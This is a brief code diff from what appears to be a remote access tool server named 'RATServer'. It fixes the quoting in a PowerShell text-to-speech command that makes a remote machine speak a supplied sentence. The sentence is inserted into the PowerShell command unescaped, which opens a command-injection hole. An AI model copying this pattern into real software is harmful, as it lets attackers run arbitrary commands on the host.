@@ -310,7 +310,7 @@ namespace RATServer
                 p.StartInfo.UseShellExecute = false;
                 p.StartInfo.RedirectStandardOutput = true;
                 p.StartInfo.FileName = "powershell.exe";
-                p.StartInfo.Arguments = $"-Command \"Add-Type -AssemblyName System.Speech;$speechSynthesizer = New-Object System.Speech.Synthesis.SpeechSynthesizer;$speechSynthesizer.Speak('" + sentence + "')";
+                p.StartInfo.Arguments = $"-Command \"Add-Type -AssemblyName System.Speech;$speechSynthesizer = New-Object System.Speech.Synthesis.SpeechSynthesizer;$speechSynthesizer.Speak('" + sentence + "')\"";
                 p.Start();              
                 p.WaitForExit();
                 r.Msg = "Talk Success";
